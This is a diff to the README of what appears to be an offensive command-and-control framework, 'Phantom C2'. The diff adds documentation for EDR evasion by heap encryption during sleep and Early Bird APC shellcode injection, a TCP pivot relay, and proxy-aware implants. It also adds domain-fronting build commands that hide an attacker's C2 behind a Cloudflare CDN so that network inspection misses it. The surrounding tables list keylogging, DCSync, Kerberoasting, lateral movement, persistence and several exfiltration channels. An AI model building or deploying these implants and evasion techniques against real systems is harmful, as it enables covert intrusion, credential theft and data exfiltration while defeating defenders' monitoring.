@@ -97,6 +97,8 @@
 - **ntdll unhooking** — loads clean .text from disk
 - **Process hollowing** — CreateProcess suspended + QueueUserAPC
 - **Sleep encryption** — Ekko-style memory encryption during sleep (defeats BeaconEye, YARA)
+- **Heap encryption during sleep** — XOR all busy heap blocks with a random key before sleeping, decrypt on wake; defeats heap scanners that scan for implant config strings
+- **Early Bird APC injection** — inject shellcode into a suspended process before EDR DLL hooks initialise; shellcode executes when thread resumes, before any TLS callbacks
 - **Indirect syscalls** — Halo's Gate SSN resolution to bypass EDR hooks
 - **Parent PID spoofing** — spawn processes under explorer.exe/svchost.exe
 - **Stack spoofing framework** — fake call stack during sleep
@@ -117,7 +119,7 @@
 - **In-memory BOF** — COFF parser (Windows), memfd_create (Linux), 55+ BOF catalog
 - **.NET assembly execution** — in-memory via PowerShell reflection (Seatbelt, Rubeus, SharpHound, Certify, etc.)
 - **Shellcode execution** — VirtualAlloc/mmap, zero disk footprint
-- **Process injection** — CreateRemoteThread
+- **Process injection** — CreateRemoteThread or Early Bird APC (`inject earlybird`)
 - **22 AD commands** — enumeration, Kerberoasting, DCSync, lateral movement
 
 **Initial Access**
@@ -391,7 +393,8 @@ You will see:
 | `cd <path>` | Change working directory |
 | `bof <file> [args]` | Execute Beacon Object File (in-memory) |
 | `shellcode <file>` | Execute raw shellcode in-memory |
-| `inject <pid> <file>` | Inject shellcode into remote process |
+| `inject <pid> <file>` | Inject shellcode into remote process (CreateRemoteThread) |
+| `inject earlybird <file>` | Inject via Early Bird APC (pre-EDR-hook, OPSEC-safe) |
 | `ad-*` | Active Directory commands (type `ad-help`) |
 | `token <cmd>` | Token manipulation (steal/make/revert/impersonate) |
 | `keylog <seconds>` | Start keylogger |
@@ -405,7 +408,7 @@ You will see:
 | `persist list` | Show installed persistence |
 | `persist remove` | Remove all persistence |
 | `lateral <method> <args>` | Lateral movement (wmiexec/winrm/psexec/ssh/pth) |
-| `pivot <cmd>` | SMB named pipe pivoting |
+| `pivot <cmd>` | SMB named pipe / TCP pivot relay |
 | `kill` | Terminate the agent |
 | `info` | Show agent details |
 | `tasks` | Show task history |
@@ -455,7 +458,7 @@ lateral winrm-spawn <target> <user> <pass> <stager_url>
 | BOF Execution | In-memory COFF loader (55+ catalog) | memfd_create |
 | .NET Assembly | In-memory via reflection | N/A |
 | Shellcode Execution | VirtualAlloc + CreateThread | mmap RWX |
-| Process Injection | CreateRemoteThread | N/A |
+| Process Injection | CreateRemoteThread / Early Bird APC | N/A |
 | Sandbox Detection | Yes | Yes |
 | Lateral Movement | wmiexec, winrm, psexec, pth | ssh |
 | Exfiltration | DNS, HTTP, ICMP, SMB, clipboard, browser, WiFi, vault | DNS, HTTP, ICMP, ssh-keys, cloud-keys |
@@ -552,6 +555,10 @@ make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
 
 # Obfuscated (garble)
 make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
+
+# Domain fronting — SNI goes to Cloudflare CDN, Host header routes to your Worker
+make agent-windows LISTENER_URL=https://cdn.cloudflare.com:443 \
+  FRONT_DOMAIN=cdn.cloudflare.com HOST_HEADER=your-c2-worker.workers.dev
 ```
 
 ### Make Targets Reference
@@ -600,6 +607,40 @@ GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-s -w \
   -X 'github.com/phantom-c2/phantom/internal/implant.ServerPubKey=$SERVER_PUB_DER_B64'" \
   -o build/agents/phantom-agent_linux_amd64 ./cmd/agent
 ```
+
+### Proxy-Aware Agents (Corporate Networks)
+
+Agents automatically detect and route through the system proxy — no configuration needed.
+
+- **Windows** — reads proxy via `HTTP_PROXY`/`HTTPS_PROXY` env vars and falls back to Windows registry (IE/WinHTTP proxy settings), so agents work through Zscaler and BlueCoat transparent proxies without modification
+- **Linux/macOS** — reads `HTTP_PROXY`, `HTTPS_PROXY`, `NO_PROXY` environment variables
+
+If the proxy is set at the OS level (e.g., by a GPO or MDM), the agent picks it up automatically. No extra build flags needed.
+
+### Domain Fronting
+
+Route agent traffic through a trusted CDN to bypass network-layer inspection. The TLS SNI goes to a CDN host defenders trust (e.g., `cdn.cloudflare.com`) while the HTTP `Host` header routes to your actual C2 origin.
+
+```bash
+# Build a domain-fronted agent pointing at a Cloudflare Worker
+make agent-windows \
+  LISTENER_URL=https://cdn.cloudflare.com:443 \
+  FRONT_DOMAIN=cdn.cloudflare.com \
+  HOST_HEADER=your-c2-worker.workers.dev
+
+# Same for Linux
+make agent-linux \
+  LISTENER_URL=https://cdn.cloudflare.com:443 \
+  FRONT_DOMAIN=cdn.cloudflare.com \
+  HOST_HEADER=your-c2-worker.workers.dev
+```
+
+**How it works:**
+1. Agent connects to `cdn.cloudflare.com:443` — TLS SNI = `cdn.cloudflare.com` (CDN's real cert is verified)
+2. HTTP `Host: your-c2-worker.workers.dev` — Cloudflare routes the request to your Worker
+3. Network inspection tools see a connection to a trusted Cloudflare IP — not your C2
+
+The profile YAML also supports `front_domain` and `host_header` fields for server-side documentation — see `configs/profiles/cloudflare.yaml` for an annotated example.
 
 ---
 
@@ -888,7 +929,9 @@ Three built-in profiles in `configs/profiles/`:
 
 - **default.yaml** — Generic API traffic (`/api/v1/status`)
 - **microsoft.yaml** — Microsoft 365/Azure (`/common/oauth2/v2.0/token`)
-- **cloudflare.yaml** — Cloudflare Workers (`/cdn-cgi/rum`)
+- **cloudflare.yaml** — Cloudflare Workers (`/cdn-cgi/rum`) — includes commented domain fronting example
+
+Profile fields: `name`, `register_uri`, `checkin_uri`, `decoy_uris`, `user_agent`, `headers`, `content_type`, `decoy_response`, `front_domain` (SNI override for domain fronting), `host_header` (HTTP Host override for domain fronting).
 
 ---
 
